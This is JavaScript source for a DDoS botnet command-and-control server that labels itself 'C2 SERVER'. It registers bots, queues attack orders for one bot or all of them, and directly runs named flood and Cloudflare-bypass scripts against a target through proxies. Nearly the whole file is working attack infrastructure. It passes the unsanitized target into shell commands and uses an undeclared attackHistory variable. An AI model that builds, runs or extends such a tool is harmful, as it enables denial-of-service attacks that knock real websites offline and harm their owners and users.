const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;

// Rate limiting (optional, remove if you want)
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000 // higher limit since no auth
});
app.use('/api/', limiter);

// Store data
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();

// Stats
let serverStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  startTime: Date.now()
};

// Bot timeout (30 seconds)
const BOT_TIMEOUT = 30000;

// Cleanup inactive bots
setInterval(() => {
  const now = Date.now();
  const beforeCount = connectedBots.length;
  connectedBots = connectedBots.filter(bot => now - bot.lastSeen < BOT_TIMEOUT);
  serverStats.totalBots = connectedBots.length;
  
  if (beforeCount !== connectedBots.length) {
    console.log(`[CLEANUP] Removed ${beforeCount - connectedBots.length} inactive bots`);
  }
}, 10000);

// Method files mapping
const methodFiles = {
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'R10-TCP': 'methods/r10-tcp.js',
  'R10-TLS': 'methods/r10-tls.js',
  'R10-CONN': 'methods/r10-conn.js',
  'R10-HEADER': 'methods/r10-header.js',
  'R10-FRAG': 'methods/r10-frag.js',
  'R10-PIPE': 'methods/r10-pipe.js',
  'R10-COOKIE': 'methods/r10-cookie.js',
  'R10-MIXED': 'methods/r10-mixed.js',
  'R10-LOWCPU': 'methods/r10-lowcpu.js',
  'RAPID10': 'methods/r10-rapid.js'
};

// ==================== BOT ENDPOINTS ====================

// Bot registration (auto-approve)
app.post('/register', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'Bot URL required' });

  if (blockedBots.has(url)) {
    console.log(`[BLOCKED] Bot tried to register: ${url}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }

  const exists = connectedBots.find(bot => bot.url === url);
  if (exists) {
    exists.lastSeen = Date.now();
    return res.json({ message: 'Bot already registered', approved: true });
  }

  const newBot = { 
    url, 
    registeredAt: new Date().toISOString(),
    lastSeen: Date.now(),
    attacksPerformed: 0
  };
  connectedBots.push(newBot);
  serverStats.totalBots = connectedBots.length;
  
  console.log(`[REGISTER] New bot registered: ${url} (Total: ${connectedBots.length})`);
  res.json({ message: 'Bot registered successfully', approved: true });
});

// Bot heartbeat/ping
app.post('/heartbeat', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'Bot URL required' });
  
  const bot = connectedBots.find(b => b.url === url);
  if (bot) {
    bot.lastSeen = Date.now();
    return res.json({ status: 'ok' });
  }
  
  // Auto-register if not exists
  if (!blockedBots.has(url)) {
    const newBot = { 
      url, 
      registeredAt: new Date().toISOString(),
      lastSeen: Date.now(),
      attacksPerformed: 0
    };
    connectedBots.push(newBot);
    serverStats.totalBots = connectedBots.length;
    console.log(`[AUTO-REG] New bot via heartbeat: ${url}`);
    return res.json({ status: 'registered' });
  }
  
  res.status(403).json({ error: 'Bot is blocked' });
});

// Bot gets command
app.get('/get-command', (req, res) => {
  const { botUrl } = req.query;
  if (!botUrl) return res.status(400).json({ error: 'Bot URL required' });
  
  // Update last seen
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) bot.lastSeen = Date.now();
  
  // Check for stop command
  if (stopCommands.has(botUrl)) {
    stopCommands.delete(botUrl);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }
  
  // Check for attack command
  if (pendingCommands[botUrl]) {
    const command = pendingCommands[botUrl];
    delete pendingCommands[botUrl];
    console.log(`[COMMAND] Sending attack command to ${botUrl}: ${command.methods} -> ${command.target}`);
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }
  
  res.json({ hasCommand: false });
});

// Bot reports attack results
app.post('/api/report', (req, res) => {
  const { botUrl, target, method, requests, duration } = req.body;
  
  serverStats.totalRequests += requests || 0;
  serverStats.attacksByMethod[method] = (serverStats.attacksByMethod[method] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;
  
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.lastReport = Date.now();
  }
  
  console.log(`[REPORT] ${botUrl} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

// ==================== CONTROL ENDPOINTS (No Auth) ====================

// Get all bots
app.get('/bots', (req, res) => {
  const botsWithStatus = connectedBots.map(bot => ({
    url: bot.url,
    lastSeen: bot.lastSeen,
    registeredAt: bot.registeredAt,
    attacksPerformed: bot.attacksPerformed || 0,
    online: (Date.now() - bot.lastSeen) < BOT_TIMEOUT
  }));
  res.json({ 
    total: connectedBots.length,
    bots: botsWithStatus 
  });
});

// Get blocked bots
app.get('/blocked', (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

// Attack a single bot
app.get('/attack-bot', (req, res) => {
  const { bot, target, time, methods } = req.query;
  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters: bot, target, time, methods' });
  }
  
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }
  
  // Check if bot exists
  const botExists = connectedBots.find(b => b.url === bot);
  if (!botExists) {
    return res.json({ success: false, error: 'Bot not found' });
  }
  
  pendingCommands[bot] = { target, time: timeNum, methods, timestamp: Date.now() };
  
  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  
  console.log(`[ATTACK-BOT] ${methods} -> ${target} on ${bot} for ${timeNum}s`);
  
  res.json({ success: true, message: 'Command sent to bot' });
});

// Attack all bots
app.get('/attack-all', (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters: target, time, methods' });
  }
  
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.json({ success: false, error: 'Invalid time (1-3600 seconds)' });
  }
  
  if (connectedBots.length === 0) {
    return res.json({ success: false, error: 'No bots connected' });
  }
  
  let commandSent = 0;
  for (const bot of connectedBots) {
    pendingCommands[bot.url] = { target, time: timeNum, methods, timestamp: Date.now() };
    commandSent++;
    serverStats.totalAttacks++;
  }
  
  serverStats.activeAttacks += commandSent;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + commandSent;
  
  console.log(`[ATTACK-ALL] ${methods} -> ${target} on ${commandSent} bots for ${timeNum}s`);
  
  res.json({ success: true, message: `Attack command sent to ${commandSent} bots` });
});

// Stop a single bot
app.get('/stop-bot', (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  delete pendingCommands[bot];
  stopCommands.add(bot);
  res.json({ success: true, message: 'Stop command sent to bot' });
});

// Stop all bots
app.get('/stop-all', (req, res) => {
  pendingCommands = {};
  connectedBots.forEach(bot => stopCommands.add(bot.url));
  serverStats.activeAttacks = 0;
  console.log(`[STOP-ALL] Stopped all attacks on ${connectedBots.length} bots`);
  res.json({ success: true, message: `Stop command sent to ${connectedBots.length} bots` });
});

// Block a bot
app.get('/block-bot', (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  blockedBots.add(bot);
  connectedBots = connectedBots.filter(b => b.url !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  
  console.log(`[BLOCK] Bot blocked: ${bot}`);
  res.json({ success: true, message: 'Bot blocked' });
});

// Unblock a bot
app.get('/unblock-bot', (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  blockedBots.delete(bot);
  console.log(`[UNBLOCK] Bot unblocked: ${bot}`);
  res.json({ success: true, message: 'Bot unblocked' });
});

// Remove a bot (disconnect)
app.get('/remove-bot', (req, res) => {
  const { bot } = req.query;
  if (!bot) return res.json({ success: false, error: 'Bot URL required' });
  
  const before = connectedBots.length;
  connectedBots = connectedBots.filter(b => b.url !== bot);
  delete pendingCommands[bot];
  stopCommands.delete(bot);
  serverStats.totalBots = connectedBots.length;
  
  console.log(`[REMOVE] Bot removed: ${bot}`);
  res.json({ success: true, message: 'Bot removed', removed: before !== connectedBots.length });
});

// ==================== SERVER-SIDE ATTACK ENDPOINTS ====================

// Execute attack from server directly
app.get('/attack', (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) {
    return res.status(400).json({ error: 'Missing parameters: target, time, methods' });
  }

  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) {
    return res.status(400).json({ error: 'Invalid time (1-3600 seconds)' });
  }

  const methodFile = methodFiles[methods];
  if (!methodFile || !fs.existsSync(methodFile)) {
    return res.status(400).json({ error: `Method not found: ${methods}` });
  }

  console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${timeNum}s`);
  
  attackHistory.push({ target, time: timeNum, method: methods, timestamp: Date.now() });
  
  serverStats.totalAttacks++;
  serverStats.activeAttacks++;
  serverStats.attacksByMethod[methods] = (serverStats.attacksByMethod[methods] || 0) + 1;
  serverStats.attacksByTarget[target] = (serverStats.attacksByTarget[target] || 0) + 1;

  res.json({ 
    success: true,
    message: 'Server attack launched', 
    target, 
    time: timeNum, 
    methods
  });

  const execWithLog = (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) { 
        console.error(`[ERROR] ${error.message}`); 
        serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
        return; 
      }
      if (stdout) {
        const lines = stdout.split('\n');
        const requestLines = lines.filter(l => l.includes('Request') || l.includes('GET') || l.includes('POST')).length;
        if (requestLines > 0) serverStats.totalRequests += requestLines;
        console.log(`[OUTPUT] ${stdout.substring(0, 200)}`);
      }
      if (stderr) console.error(`[STDERR] ${stderr.substring(0, 200)}`);
    });
  };

  // Execute based on method
  switch(methods) {
    case 'CF-BYPASS':
      execWithLog(`node methods/cf-bypass.js ${target} ${timeNum} 4 32 proxy.txt`);
      break;
    case 'MODERN-FLOOD':
      execWithLog(`node methods/modern-flood.js ${target} ${timeNum} 4 64 proxy.txt`);
      break;
    case 'HTTP-SICARIO':
      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 16 3 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 32 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 12 4 proxy.txt`);
      break;
    case 'RAW-HTTP':
      execWithLog(`node methods/h2-nust ${target} ${timeNum} 15 2 proxy.txt`);
      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
      break;
    case 'R9':
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt`);
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 8 1 proxy.txt`);
      break;
    case 'PRIV-TOR':
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 64 6 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 12 4 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 10 4 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 10 1 proxy.txt`);
      break;
    case 'HOLD-PANEL':
      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
      break;
    case 'R1':
      execWithLog(`node methods/vhold.js ${target} ${timeNum} 15 2 proxy.txt`);
      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 64 2 proxy.txt`);
      execWithLog(`node methods/cibi.js ${target} ${timeNum} 4 2 proxy.txt`);
      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 16 2 proxy.txt`);
      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
      execWithLog(`node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`);
      break;
    case 'RAPID10':
      console.log(`[RAPID10] Launching all 10 vectors on ${target}`);
      execWithLog(`node methods/r10-rapid.js ${target} ${timeNum} 10000`);
      execWithLog(`node methods/r10-tcp.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-tls.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-conn.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-header.js ${target} ${timeNum} 5000`);
      execWithLog(`node methods/r10-frag.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-pipe.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-cookie.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-mixed.js ${target} ${timeNum}`);
      execWithLog(`node methods/r10-lowcpu.js ${target} ${timeNum} 1000`);
      break;
    case 'UAM':
      execWithLog(`node methods/uam.js ${target} ${timeNum} 5 4 6`);
      break;
    case 'W.I.L':
      execWithLog(`node methods/wil.js ${target} ${timeNum} 10 8 4`);
      break;
    default:
      // Try to execute as custom method file
      if (methodFiles[methods]) {
        execWithLog(`node ${methodFiles[methods]} ${target} ${timeNum}`);
      } else {
        console.error(`[ERROR] Unknown method: ${methods}`);
        serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
      }
  }
  
  setTimeout(() => {
    serverStats.activeAttacks = Math.max(0, serverStats.activeAttacks - 1);
  }, timeNum * 1000);
});

// ==================== STATUS ENDPOINTS ====================

// Server stats
app.get('/stats', (req, res) => {
  const now = Date.now();
  const onlineBots = connectedBots.filter(b => now - b.lastSeen < BOT_TIMEOUT).length;
  
  res.json({
    uptime: Math.floor((now - serverStats.startTime) / 1000),
    totalBots: connectedBots.length,
    onlineBots: onlineBots,
    offlineBots: connectedBots.length - onlineBots,
    activeAttacks: serverStats.activeAttacks,
    totalAttacks: serverStats.totalAttacks,
    totalRequests: serverStats.totalRequests,
    attacksByMethod: serverStats.attacksByMethod,
    attacksByTarget: serverStats.attacksByTarget,
    blockedCount: blockedBots.size
  });
});

// Simple ping
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true, 
    timestamp: Date.now(),
    bots: connectedBots.length,
    uptime: Math.floor((Date.now() - serverStats.startTime) / 1000)
  });
});

// Attack history
app.get('/history', (req, res) => {
  res.json({ 
    attacks: attackHistory.slice(-50) // Last 50 attacks
  });
});

// Clear all data (admin)
app.get('/clear-all', (req, res) => {
  const secret = req.query.secret;
  if (secret !== 'CLEAR_ALL_BOTS') {
    return res.status(401).json({ error: 'Invalid secret' });
  }
  
  connectedBots = [];
  pendingCommands = {};
  stopCommands.clear();
  attackHistory = [];
  serverStats.activeAttacks = 0;
  
  res.json({ success: true, message: 'All data cleared' });
});

// ==================== UTILITIES ====================

// List available methods
app.get('/methods', (req, res) => {
  const available = [];
  for (const [name, file] of Object.entries(methodFiles)) {
    if (fs.existsSync(file)) {
      available.push(name);
    }
  }
  res.json({ 
    methods: available,
    total: available.length,
    allMethods: Object.keys(methodFiles)
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy',
    bots: connectedBots.length,
    timestamp: Date.now()
  });
});

// Error handling
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(port, () => {
  console.log('\n========================================');
  console.log('C2 SERVER STARTED (API ONLY)');
  console.log('========================================');
  console.log(`Port: ${port}`);
  console.log(`No authentication required`);
  console.log('========================================\n');
  
  // Create directories if needed
  if (!fs.existsSync('./methods')) {
    fs.mkdirSync('./methods');
    console.log('[SETUP] Created methods directory');
  }
  
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Add proxies here (ip:port)\n');
    console.log('[SETUP] Created proxy.txt');
  }
  
  console.log('\n📌 API Endpoints:');
  console.log('   GET  /bots        - List all bots');
  console.log('   GET  /stats       - Server statistics');
  console.log('   GET  /attack?target=URL&time=SEC&methods=METHOD - Server attack');
  console.log('   GET  /attack-all?target=URL&time=SEC&methods=METHOD - Attack all bots');
  console.log('   GET  /attack-bot?bot=URL&target=URL&time=SEC&methods=METHOD - Attack single bot');
  console.log('   GET  /stop-all    - Stop all attacks');
  console.log('   POST /register    - Bot registration');
  console.log('   GET  /get-command?botUrl=URL - Bot polls for commands');
  console.log('   POST /api/report  - Bot reports results');
  console.log('');
});